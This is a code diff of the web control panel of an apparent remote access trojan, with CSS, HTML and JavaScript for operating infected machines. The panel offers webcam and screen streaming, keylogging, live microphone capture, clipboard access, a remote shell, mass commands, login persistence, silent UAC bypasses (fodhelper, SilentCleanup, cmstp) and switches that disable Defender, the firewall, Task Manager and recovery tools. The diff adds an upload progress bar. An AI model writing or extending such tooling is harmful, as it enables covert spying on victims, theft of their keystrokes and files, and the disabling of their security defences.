@@ -12,7 +12,6 @@
 html,body{height:100%;overflow:hidden;}
 body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;display:flex;flex-direction:column;}
 body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.012) 2px,rgba(0,255,136,0.012) 4px);pointer-events:none;z-index:0;}
-/* Header */
 .header{flex-shrink:0;padding:14px 28px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:linear-gradient(135deg,rgba(0,255,136,0.05),transparent);z-index:10;}
 .logo{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:22px;letter-spacing:8px;color:var(--accent);text-shadow:var(--glow);}
 .logo span{color:var(--accent2);}
@@ -20,7 +19,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .live-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:pulse 2s infinite;}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
 .clock{color:var(--accent2);font-size:13px;}
-/* Layout */
 .app-body{flex:1;display:flex;overflow:hidden;position:relative;z-index:1;}
 .sidebar{width:240px;flex-shrink:0;border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;}
 .sidebar-top{flex-shrink:0;padding:10px 14px;font-size:9px;letter-spacing:3px;color:var(--dim);border-bottom:1px solid var(--border);text-transform:uppercase;display:flex;justify-content:space-between;align-items:center;}
@@ -37,7 +35,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .node-dot.online{background:var(--accent);box-shadow:0 0 5px var(--accent);animation:pulse 1.5s infinite;}
 .node-dot.offline{background:var(--warn);}
 .empty-sidebar{padding:30px 14px;text-align:center;color:var(--dim);font-size:11px;line-height:2;}
-/* Main */
 .main-area{flex:1;display:flex;flex-direction:column;overflow:hidden;}
 .stats-row{flex-shrink:0;display:grid;grid-template-columns:repeat(3,1fr);gap:10px;padding:12px 20px;border-bottom:1px solid var(--border);}
 .stat-card{background:var(--panel);border:1px solid var(--border);padding:12px 16px;position:relative;overflow:hidden;}
@@ -51,11 +48,9 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .content-area{flex:1;overflow-y:auto;padding:14px 20px;}
 .content-area::-webkit-scrollbar{width:5px;}
 .content-area::-webkit-scrollbar-thumb{background:var(--border);}
-/* Panel */
 .panel{background:var(--panel);border:1px solid var(--border);margin-bottom:14px;}
 .panel-header{padding:9px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;}
 .panel-header .accent{color:var(--accent);}
-/* Table */
 table{width:100%;border-collapse:collapse;font-size:12px;}
 th{text-align:left;padding:9px 14px;font-size:9px;letter-spacing:2px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);}
 td{padding:10px 14px;border-bottom:1px solid rgba(26,35,50,0.4);vertical-align:middle;}
@@ -68,7 +63,6 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 .status-badge.online::before{animation:pulse 1.5s infinite;}
 .hostname{color:var(--accent2);font-weight:bold;}
 .platform-badge{font-size:10px;padding:2px 7px;background:rgba(0,180,255,0.08);border:1px solid rgba(0,180,255,0.2);color:var(--accent2);}
-/* Buttons */
 .btn{font-family:'Share Tech Mono',monospace;font-size:11px;padding:5px 12px;border:1px solid;cursor:pointer;background:transparent;letter-spacing:1px;transition:all .15s;border-radius:2px;}
 .btn:disabled{opacity:0.4;cursor:not-allowed;}
 .btn-green{color:var(--accent);border-color:rgba(0,255,136,0.4);}
@@ -82,7 +76,6 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 .btn-purple{color:var(--purple);border-color:rgba(179,136,255,0.4);}
 .btn-purple:hover:not(:disabled){background:rgba(179,136,255,0.1);}
 .btn-sm{padding:3px 8px;font-size:10px;}
-/* Modal */
 .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:1000;align-items:center;justify-content:center;}
 .modal-overlay.open{display:flex;}
 .modal{background:var(--panel);border:1px solid var(--border);width:98vw;max-width:1400px;height:92vh;display:flex;flex-direction:column;overflow:hidden;}
@@ -98,7 +91,6 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 .modal-body{flex:1;min-height:0;display:flex;flex-direction:column;}
 .tab-content{display:none;flex:1;min-height:0;flex-direction:column;}
 .tab-content.active{display:flex;}
-/* Stream */
 .stream-wrapper{flex:1;min-height:0;overflow:auto;display:flex;align-items:flex-start;justify-content:center;padding:10px;background:#000;}
 .stream-wrapper::-webkit-scrollbar{width:5px;height:5px;}
 .stream-wrapper::-webkit-scrollbar-thumb{background:var(--border);}
@@ -106,13 +98,11 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 #webcam-img{max-width:100%;display:block;}
 .stream-toolbar{flex-shrink:0;padding:8px 14px;border-top:1px solid var(--border);display:flex;align-items:center;gap:8px;flex-wrap:wrap;}
 .stream-status{font-size:10px;color:var(--dim);margin-left:auto;}
-/* Keylog */
 .keylog-output{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;font-size:13px;line-height:2;background:#050810;border:none;white-space:pre-wrap;word-break:break-all;}
 .keylog-output::-webkit-scrollbar{width:4px;}
 .keylog-output::-webkit-scrollbar-thumb{background:var(--border);}
 .kl-special{color:var(--warn);}
 .keylog-controls{flex-shrink:0;padding:8px 16px;border-top:1px solid var(--border);display:flex;gap:8px;align-items:center;}
-/* Shell */
 .shell-output{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;font-size:12px;line-height:1.8;background:#050810;white-space:pre-wrap;word-break:break-all;}
 .shell-output::-webkit-scrollbar{width:4px;}
 .shell-output::-webkit-scrollbar-thumb{background:var(--border);}
@@ -122,14 +112,12 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 .shell-input-row{flex-shrink:0;padding:8px 14px;border-top:1px solid var(--border);display:flex;gap:8px;align-items:center;}
 .shell-input-row span{color:var(--accent);font-size:13px;}
 .shell-input{flex:1;background:transparent;border:none;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;}
-/* Clipboard */
 .clip-area{flex:1;min-height:0;overflow-y:auto;padding:14px 18px;}
 .clip-area::-webkit-scrollbar{width:4px;}
 .clip-area::-webkit-scrollbar-thumb{background:var(--border);}
 .clip-display{background:#050810;border:1px solid var(--border);padding:10px 12px;font-size:12px;color:var(--text);min-height:60px;max-height:180px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-bottom:10px;}
 .clip-input{width:100%;background:#050810;border:1px solid var(--border);padding:8px 12px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;resize:vertical;min-height:60px;outline:none;margin-bottom:8px;}
 .clip-input:focus{border-color:rgba(0,255,136,0.4);}
-/* File browser */
 .fb-nav{flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:7px;align-items:center;}
 .fb-path{flex:1;background:#050810;border:1px solid var(--border);padding:5px 9px;color:var(--accent2);font-family:'Share Tech Mono',monospace;font-size:11px;outline:none;}
 .fb-colhdr{flex-shrink:0;display:flex;align-items:center;gap:8px;padding:6px 10px 6px 18px;font-size:9px;letter-spacing:2px;color:var(--dim);border-bottom:1px solid var(--border);text-transform:uppercase;}
@@ -145,7 +133,6 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 .fb-item .fi-date{color:var(--dim);font-size:10px;min-width:110px;text-align:right;}
 .fb-item .fi-act{display:flex;gap:4px;opacity:0;min-width:80px;justify-content:flex-end;}
 .fb-item:hover .fi-act{opacity:1;}
-/* Sysinfo */
 .sysinfo-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
 .si-card{background:var(--panel2);border:1px solid var(--border);padding:12px 14px;}
 .si-label{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:5px;}
@@ -156,30 +143,25 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 .progress-fill{height:100%;border-radius:2px;background:var(--accent);}
 .progress-fill.warn{background:var(--warn);}
 .progress-fill.danger{background:var(--danger);}
-/* Processes */
 .proc-table th{padding:7px 10px;}
 .proc-table td{padding:6px 10px;border-bottom:1px solid rgba(26,35,50,0.35);}
-/* Network */
 .net-section{margin-bottom:16px;}
 .net-title{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:8px;padding-bottom:4px;border-bottom:1px solid var(--border);}
 .net-iface{display:flex;gap:16px;padding:6px 10px;border-bottom:1px solid rgba(26,35,50,0.3);font-size:11px;}
 .net-iface .ni-name{color:var(--accent2);min-width:120px;}
 .net-iface .ni-ip{color:var(--text);}
 .net-iface .ni-mask{color:var(--dim);}
-/* Mic */
 .mic-area{flex:1;min-height:0;overflow-y:auto;padding:16px 18px;}
 .mic-area::-webkit-scrollbar{width:4px;}
 .mic-area::-webkit-scrollbar-thumb{background:var(--border);}
 .audio-item{background:var(--panel2);border:1px solid var(--border);padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:12px;}
 .audio-item audio{flex:1;height:28px;}
-/* Screenshot gallery */
 .ss-gallery{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;align-content:start;}
 .ss-gallery::-webkit-scrollbar{width:4px;}
 .ss-gallery::-webkit-scrollbar-thumb{background:var(--border);}
 .ss-thumb{background:var(--panel2);border:1px solid var(--border);overflow:hidden;cursor:pointer;}
 .ss-thumb img{width:100%;display:block;}
 .ss-thumb .ss-info{padding:5px 8px;font-size:10px;color:var(--dim);}
-/* Chat */
 .chat-messages{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;}
 .chat-messages::-webkit-scrollbar{width:4px;}
 .chat-messages::-webkit-scrollbar-thumb{background:var(--border);}
@@ -197,7 +179,6 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 .chat-input{flex:1;background:#050810;border:1px solid var(--border);padding:7px 10px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;}
 .chat-input:focus{border-color:rgba(0,255,136,0.4);}
 .chat-input:disabled{opacity:0.4;}
-/* Mass cmd */
 .mass-area{flex:1;min-height:0;overflow-y:auto;padding:14px 18px;}
 .mass-area::-webkit-scrollbar{width:4px;}
 .mass-area::-webkit-scrollbar-thumb{background:var(--border);}
@@ -205,9 +186,7 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 .mass-result .mr-host{color:var(--accent2);margin-bottom:3px;}
 .mass-result .mr-out{color:var(--text);white-space:pre-wrap;word-break:break-all;}
 .mass-result .mr-err{color:var(--warn);}
-/* Persist */
 .persist-area{flex:1;min-height:0;overflow-y:auto;padding:16px 18px;}
-/* Log */
 .log-area{overflow-y:auto;padding:10px 14px;font-size:11px;max-height:140px;color:var(--dim);line-height:1.8;}
 .log-area::-webkit-scrollbar{width:3px;}
 .log-area::-webkit-scrollbar-thumb{background:var(--border);}
@@ -217,7 +196,6 @@ tr:hover td{background:rgba(0,255,136,0.02);}
 .log-msg.disconnect{color:var(--warn);}
 .log-msg.info{color:var(--accent2);}
 .log-msg.error{color:var(--danger);}
-/* Login overlay */
 .login-overlay{position:fixed;inset:0;background:var(--bg);z-index:9999;display:flex;align-items:center;justify-content:center;}
 .login-box{background:var(--panel);border:1px solid var(--border);padding:40px 48px;min-width:320px;display:flex;flex-direction:column;gap:14px;}
 .login-title{font-family:'Rajdhani',sans-serif;font-size:28px;font-weight:700;color:var(--accent);letter-spacing:8px;text-align:center;text-shadow:var(--glow);}
@@ -236,6 +214,9 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
 .tag-green{color:var(--accent);border-color:rgba(0,255,136,0.3);background:rgba(0,255,136,0.08);}
 .tag-red{color:var(--danger);border-color:rgba(255,51,102,0.3);background:rgba(255,51,102,0.08);}
 .tag-blue{color:var(--accent2);border-color:rgba(0,180,255,0.3);background:rgba(0,180,255,0.08);}
+/* Upload progress bar */
+.upload-progress{display:none;height:3px;background:var(--border);border-radius:2px;overflow:hidden;margin-top:4px;width:100%;}
+.upload-progress-fill{height:100%;background:var(--accent);width:0%;transition:width 0.2s;}
 </style>
 </head>
 <body>
@@ -331,17 +312,22 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
           <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--danger);cursor:pointer;" title="Block all keyboard and mouse input on target">
             <input type="checkbox" id="disable-input-toggle" onchange="toggleDisableInput(this.checked)"> DISABLE KB+MOUSE
           </label>
-          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--danger);cursor:pointer;" title="Kill Task Manager / Activity Monitor the moment it opens">
+          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--danger);cursor:pointer;" title="Kill Task Manager the moment it opens">
             <input type="checkbox" id="block-taskmgr-toggle" onchange="toggleBlockTaskmgr(this.checked)"> BLOCK TASK MGR
           </label>
         </div>
-        <div class="stream-toolbar" style="border-top:none;padding-top:0;">
-          <span style="font-size:10px;color:var(--dim);">🎬 MEDIA:</span>
-          <input type="file" id="media-file" accept="audio/*,video/*" style="font-size:10px;color:var(--dim);flex:1;min-width:180px;max-width:320px;">
-          <button class="btn btn-purple btn-sm" onclick="sendMedia(false)">🔊 PLAY</button>
-          <button class="btn btn-red btn-sm" onclick="sendMedia(true)">🔒 PLAY UNCLOSABLE</button>
-          <span id="media-status" style="font-size:10px;color:var(--dim);margin-left:4px;"></span>
-          <span class="stream-status" id="stream-status">IDLE</span>
+        <div class="stream-toolbar" style="border-top:none;padding-top:0;flex-direction:column;align-items:flex-start;gap:6px;">
+          <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;width:100%;">
+            <span style="font-size:10px;color:var(--dim);">🎬 MEDIA:</span>
+            <input type="file" id="media-file" accept="audio/*,video/*" style="font-size:10px;color:var(--dim);flex:1;min-width:180px;max-width:320px;">
+            <button class="btn btn-purple btn-sm" onclick="sendMedia(false)">🔊 PLAY</button>
+            <button class="btn btn-red btn-sm" onclick="sendMedia(true)">🔒 PLAY UNCLOSABLE</button>
+            <span id="media-status" style="font-size:10px;color:var(--dim);margin-left:4px;"></span>
+            <span class="stream-status" id="stream-status">IDLE</span>
+          </div>
+          <div class="upload-progress" id="upload-progress" style="display:none;width:100%;">
+            <div class="upload-progress-fill" id="upload-progress-fill"></div>
+          </div>
         </div>
       </div>
 
@@ -500,7 +486,7 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
         <div class="persist-area">
           <div style="margin-bottom:20px;padding:14px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);">
             <div style="font-size:10px;color:var(--warn);letter-spacing:2px;margin-bottom:6px;">⚠ PERSISTENCE</div>
-            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Installs the agent to auto-start on login.<br>Windows: Task Scheduler (logon trigger, auto-restart) · macOS: LaunchAgent · Linux: Systemd user service</div>
+            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Installs the agent to auto-start on login.<br>Windows: Task Scheduler (logon trigger) · macOS: LaunchAgent · Linux: Systemd user service</div>
           </div>
           <div style="display:flex;gap:10px;margin-bottom:20px;">
             <button class="btn btn-warn" onclick="persistInstall()">⚙ INSTALL AUTOSTART</button>
@@ -515,11 +501,11 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
         <div class="persist-area">
           <div style="margin-bottom:16px;padding:14px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);">
             <div style="font-size:10px;color:var(--warn);letter-spacing:2px;margin-bottom:6px;">⚡ PRIVILEGE ESCALATION</div>
-            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Relaunches the agent elevated using the same Client ID — the current session briefly disconnects then reconnects as Administrator. No new node is created.<br><br>
-              <span style="color:var(--accent);">🛡 UAC Prompt:</span> Shows a UAC dialog on the target. If accepted, session upgrades to admin.<br>
-              <span style="color:var(--accent2);">🪟 FodHelper:</span> Silent bypass via fodhelper.exe autoElevate (Windows 10/11, no prompt).<br>
-              <span style="color:var(--accent2);">🧹 SilentCleanup:</span> Silent bypass via WINDIR registry hijack on the DiskCleanup scheduled task.<br>
-              <span style="color:var(--accent2);">📋 cmstp.exe:</span> Silent bypass via CM shell .inf RunPreSetupCommands auto-execute.
+            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Relaunches the agent elevated using the same Client ID.<br><br>
+              <span style="color:var(--accent);">🛡 UAC Prompt:</span> Shows a UAC dialog on target.<br>
+              <span style="color:var(--accent2);">🪟 FodHelper:</span> Silent bypass via fodhelper.exe autoElevate.<br>
+              <span style="color:var(--accent2);">🧹 SilentCleanup:</span> Silent bypass via WINDIR registry hijack.<br>
+              <span style="color:var(--accent2);">📋 cmstp.exe:</span> Silent bypass via CM shell .inf auto-execute.
             </div>
           </div>
           <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;">
@@ -536,143 +522,74 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
       <!-- ADMIN -->
       <div class="tab-content" id="tab-admin">
         <div style="flex:1;min-height:0;overflow-y:auto;padding:16px 18px;">
-
           <div style="margin-bottom:4px;font-size:9px;letter-spacing:3px;color:var(--danger);text-transform:uppercase;">⚠ Requires Administrator — use PRIVESC tab first if needed</div>
-
-          <!-- SECTION: System Tools -->
           <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">System Tools</div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:4px;">
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Task Manager</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('taskmgr_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('taskmgr_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('taskmgr_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('taskmgr_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Registry Editor (regedit)</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('regedit_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('regedit_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('regedit_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('regedit_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Command Prompt (cmd)</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('cmd_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('cmd_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('cmd_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('cmd_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Control Panel</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('controlpanel_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('controlpanel_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('controlpanel_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('controlpanel_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">reagentc.exe (WinRE)</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('reagentc_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('reagentc_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('reagentc_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('reagentc_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Run Dialog (Win+R)</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('rundialog_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('rundialog_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('rundialog_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('rundialog_enable')">ENABLE</button></div>
             </div>
-
           </div>
-
-          <!-- SECTION: Windows Defender / Security -->
           <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Windows Defender / Security</div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:4px;">
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Windows Defender (Real-time)</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('defender_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('defender_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('defender_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('defender_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Windows Firewall</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('firewall_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('firewall_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('firewall_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('firewall_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">UAC (User Account Control)</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('uac_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('uac_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('uac_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('uac_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Windows Update</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('wupdate_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('wupdate_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('wupdate_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('wupdate_enable')">ENABLE</button></div>
             </div>
-
           </div>
-
-          <!-- SECTION: Desktop Restrictions -->
           <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Desktop Restrictions</div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:4px;">
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Right-Click Desktop Menu</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('rightclick_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('rightclick_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('rightclick_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('rightclick_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Lock Screen</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('lockscreen_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('lockscreen_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('lockscreen_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('lockscreen_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">USB Storage</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('usb_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('usb_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('usb_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('usb_enable')">ENABLE</button></div>
             </div>
-
             <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
               <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Startup Repair (WinRE Boot)</div>
-              <div style="display:flex;gap:6px;">
-                <button class="btn btn-red btn-sm" onclick="adminCmd('startuprepair_disable')">DISABLE</button>
-                <button class="btn btn-green btn-sm" onclick="adminCmd('startuprepair_enable')">ENABLE</button>
-              </div>
+              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('startuprepair_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('startuprepair_enable')">ENABLE</button></div>
             </div>
-
           </div>
-
-          <!-- SECTION: Log -->
           <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Result Log</div>
           <div id="admin-result" style="font-size:12px;color:var(--dim);background:#050810;border:1px solid var(--border);padding:10px 14px;min-height:60px;max-height:160px;overflow-y:auto;white-space:pre-wrap;line-height:1.8;"></div>
-
         </div>
       </div>
 
@@ -708,11 +625,13 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
 const socket = io();
 let clients = [];
 let selectedClient = null;
+let _dashboardToken = '';   // saved on login for HTTP uploads
 
 // ── Auth ──
 function doLogin(){
   const pass = document.getElementById('login-pass').value;
   document.getElementById('login-err').textContent = '';
+  _dashboardToken = pass;
   socket.emit('dashboard_auth', {password: pass});
 }
 socket.on('auth_result', res => {
@@ -729,10 +648,10 @@ socket.on('auth_required', () => {
   document.getElementById('login-overlay').style.display = 'flex';
 });
 socket.on('connect', () => {
-  // Show login on every (re)connect — server will reject events until authed
   document.getElementById('login-overlay').style.display = 'flex';
   document.getElementById('login-pass').focus();
 });
+
 let streaming = false;
 let webcamStreaming = false;
 let remoteCtrl = false;
@@ -749,7 +668,6 @@ function clock(){ document.getElementById('clock').textContent = new Date().toTi
 setInterval(clock,1000); clock();
 
 // ── Socket ──
-socket.on('connect', () => { addLog('Connected — authenticating...','info'); });
 socket.on('disconnect', () => addLog('Lost connection','disconnect'));
 socket.on('client_update', data => renderClients(data.clients||[]));
 
@@ -784,13 +702,11 @@ socket.on('keylog_data', data => {
 socket.on('mic_live_chunk', data => {
   if(!selectedClient || data.client_id !== selectedClient.id) return;
   if(data.error){ addLog('Live mic error: '+data.error,'error'); return; }
-  // Decode PCM int16 and play + visualize
   const raw = atob(data.data);
   const buf = new Int16Array(raw.length/2);
   for(let i=0;i<buf.length;i++) buf[i] = (raw.charCodeAt(i*2)) | (raw.charCodeAt(i*2+1)<<8);
   const float = new Float32Array(buf.length);
   for(let i=0;i<buf.length;i++) float[i] = buf[i]/32768;
-  // Play via Web Audio
   if(micAudioCtx){
     const ab = micAudioCtx.createBuffer(1, float.length, data.rate||22050);
     ab.getChannelData(0).set(float);
@@ -799,7 +715,6 @@ socket.on('mic_live_chunk', data => {
     src.connect(micAudioCtx.destination);
     src.start();
   }
-  // Visualize
   drawMicWave(float);
 });
 
@@ -834,17 +749,10 @@ function drawMicWave(samples){
   const ctx = canvas.getContext('2d');
   canvas.width = canvas.offsetWidth;
   const w = canvas.width, h = canvas.height;
-  ctx.fillStyle = '#050810';
-  ctx.fillRect(0,0,w,h);
-  ctx.strokeStyle = '#ff3366';
-  ctx.lineWidth = 1.5;
-  ctx.beginPath();
+  ctx.fillStyle = '#050810'; ctx.fillRect(0,0,w,h);
